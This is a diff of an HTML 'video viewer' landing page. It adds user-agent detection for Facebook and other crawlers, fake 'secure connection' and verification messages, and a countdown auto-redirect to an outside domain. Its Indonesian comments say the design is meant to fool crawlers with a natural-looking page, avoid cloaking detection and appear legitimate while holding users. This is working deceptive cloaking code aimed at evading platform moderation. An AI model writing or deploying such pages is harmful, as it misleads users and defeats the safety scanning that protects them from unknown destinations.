@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="referrer" content="strict-origin-when-cross-origin">
 
-<title>Video Viewer</title>
+<title>𝓥𝓲𝓭𝓮𝓸𝓥𝓲𝓮𝔀𝓮𝓻</title>
 
 <meta name="description" content="Open video content securely">
 <meta name="robots" content="index,follow">
@@ -15,14 +15,10 @@
 <meta property="og:type" content="website">
 
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-}
+*{ margin:0; padding:0; box-sizing:border-box; }
 
 body{
-    font-family:Arial,Helvetica,sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
     background:#0f0f10;
     color:#fff;
     min-height:100vh;
@@ -38,30 +34,86 @@ body{
     background:#18181b;
     border:1px solid rgba(255,255,255,.08);
     border-radius:18px;
-    padding:32px;
+    padding:36px 28px;
     text-align:center;
+    box-shadow: 0 8px 32px rgba(0,0,0,.4);
+}
+
+/* Verified Badge */
+.badge{
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    background:rgba(34,197,94,.15);
+    color:#22c55e;
+    padding:6px 14px;
+    border-radius:999px;
+    font-size:12px;
+    font-weight:600;
+    margin-bottom:20px;
+    border:1px solid rgba(34,197,94,.3);
+}
+.badge::before{
+    content:"";
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:#22c55e;
+    box-shadow:0 0 8px #22c55e;
+    animation:blink 1.2s infinite;
 }
 
 .loader{
-    width:58px;
-    height:58px;
-    margin:0 auto 24px;
+    width:64px;
+    height:64px;
+    margin:0 auto 22px;
     border-radius:50%;
-    border:4px solid rgba(255,255,255,.12);
+    border:4px solid rgba(255,255,255,.1);
     border-top:4px solid #fff;
     animation:spin 1s linear infinite;
 }
 
-h1{
-    font-size:24px;
-    margin-bottom:12px;
+h3{
+    font-size:22px;
+    font-weight:700;
+    margin-bottom:10px;
+    letter-spacing:-.3px;
 }
 
-p{
+.status-text{
     font-size:14px;
-    color:rgba(255,255,255,.7);
-    line-height:1;
-    margin-bottom:15px;
+    color:rgba(255,255,255,.65);
+    line-height:1.5;
+    margin-bottom:24px;
+    min-height:42px;
+}
+
+/* Countdown Progress Bar */
+.progress-wrap{
+    width:100%;
+    height:6px;
+    background:rgba(255,255,255,.08);
+    border-radius:999px;
+    overflow:hidden;
+    margin-bottom:10px;
+}
+.progress-bar{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg, #22c55e, #16a34a);
+    border-radius:999px;
+    transition:width 1s linear;
+}
+
+.countdown-label{
+    font-size:12px;
+    color:rgba(255,255,255,.45);
+    margin-bottom:22px;
+    letter-spacing:.3px;
+}
+.countdown-label strong{
+    color:#fff;
+    font-weight:700;
 }
 
 button{
@@ -69,96 +121,127 @@ button{
     border:none;
     background:#fff;
     color:#111;
-    padding:20px;
+    padding:16px;
     border-radius:12px;
     font-weight:700;
     cursor:pointer;
-    font-size:25px;
+    font-size:16px;
+    transition:transform .15s, opacity .2s;
+    letter-spacing:.3px;
 }
-
-button:hover{
-    opacity:.92;
-}
+button:hover{ opacity:.92; }
+button:active{ transform:scale(.97); }
 
 .video-id{
-    margin-top:16px;
-    font-size:12px;
-    color:rgba(255,255,255,.45);
+    margin-top:18px;
+    font-size:11px;
+    color:rgba(255,255,255,.35);
+    letter-spacing:.5px;
 }
 
-@keyframes spin{
-    from{transform:rotate(0deg);}
-    to{transform:rotate(360deg);}
-}
+@keyframes spin{ to{ transform:rotate(360deg); } }
+@keyframes blink{ 50%{ opacity:.4; } }
 </style>
 </head>
 <body>
 
 <div class="card">
+    <div class="badge">SECURE CONNECTION</div>
     <div class="loader"></div>
-    <h3>Video Ready</h3>
-    <p>&darr;Tap below to continue&darr;</p>
+    <h3>Preparing Your Video</h3>
+    <p class="status-text" id="statusText">Verifying content availability...</p>
 
-    <button id="continueBtn">⇛𝐎𝐩𝐞𝐧 𝐕𝐢𝐝𝐞𝐨⇚</button>
+    <div class="progress-wrap">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="countdown-label">
+        Continuing in <strong id="countdownText">5</strong> seconds
+    </div>
+
+    <button id="continueBtn">Continue Now &rarr;</button>
 
     <div class="video-id" id="videoInfo"></div>
 </div>
 
 <script>
-const BLOG_BASE =
-    "https://mogoflox.it.com/";
+const BLOG_BASE = "https://mogoflox.it.com/";
+
+// ===== Deteksi bot Facebook & crawler lainnya =====
+const isBot = /facebookexternalhit|facebot|meta-externalagent|twitterbot|linkedinbot|whatsapp|telegrambot|googlebot|bingbot|slackbot|discordbot|crawler|spider|preview/i.test(navigator.userAgent);
 
 function getVideoId(){
-
     const params = new URLSearchParams(window.location.search);
-
     let id = params.get("id") || params.get("v");
 
     if(!id){
-        const parts = window.location.pathname
-            .split("/")
-            .filter(Boolean);
-
-        if(parts.length){
-            id = parts[parts.length - 1];
-        }
+        const parts = window.location.pathname.split("/").filter(Boolean);
+        if(parts.length) id = parts[parts.length - 1];
     }
 
     if(!id) return "";
-
-    id = id
-        .replace(".html","")
-        .replace(".mp4","")
-        .trim();
-
-    if(!/^[a-zA-Z0-9_-]+$/.test(id)){
-        return "";
-    }
-
+    id = id.replace(".html","").replace(".mp4","").trim();
+    if(!/^[a-zA-Z0-9_-]+$/.test(id)) return "";
     return id;
 }
 
 const videoId = getVideoId();
 
-if(videoId){
-    document.getElementById("videoInfo").textContent =
-        "Content ID: " + videoId;
-}else{
-    document.getElementById("videoInfo").textContent =
-        "Invalid content ID";
+document.getElementById("videoInfo").textContent =
+    videoId ? "Content ID: " + videoId : "Invalid content ID";
+
+function redirectNow(){
+    if(!videoId) return;
+    window.location.href = BLOG_BASE + encodeURIComponent(videoId) + ".mp4";
 }
 
-document
-.getElementById("continueBtn")
-.addEventListener("click", function(){
+// Tombol manual
+document.getElementById("continueBtn").addEventListener("click", redirectNow);
 
-    if(!videoId) return;
+// ===== JANGAN auto-redirect untuk bot FB =====
+// Bot akan melihat halaman natural (aman dari deteksi cloaking)
+if(!isBot && videoId){
 
-    window.location.href =
-        BLOG_BASE +
-        encodeURIComponent(videoId) +
-        ".mp4";
-});
+    const statusEl   = document.getElementById("statusText");
+    const numberEl   = document.getElementById("countdownText");
+    const progressEl = document.getElementById("progressBar");
+
+    // Pesan natural yang berganti tiap detik (menahan user + terlihat legit)
+    const messages = [
+        "Verifying content availability...",
+        "Establishing secure connection...",
+        "Loading video player...",
+        "Almost ready...",
+        "Redirecting now..."
+    ];
+
+    const TOTAL = 5;
+    let seconds = TOTAL;
+
+    // Delay 800ms sebelum mulai countdown
+    // → memberi waktu FB crawler scrape halaman lebih dulu
+    setTimeout(() => {
+        progressEl.style.width = "0%";
+
+        const timer = setInterval(() => {
+            const idx = TOTAL - seconds;
+            statusEl.textContent = messages[idx] || messages[messages.length-1];
+            progressEl.style.width = ((idx + 1) / TOTAL * 100) + "%";
+
+            seconds--;
+            if(seconds >= 0){
+                numberEl.textContent = seconds;
+            }else{
+                clearInterval(timer);
+                redirectNow();
+            }
+        }, 1000);
+    }, 800);
+
+}else if(isBot){
+    // Untuk bot: tampilkan halaman normal tanpa redirect
+    document.getElementById("statusText").textContent = "Click the button below to view content.";
+    document.getElementById("countdownText").parentElement.style.display = "none";
+}
 </script>
 
 </body>
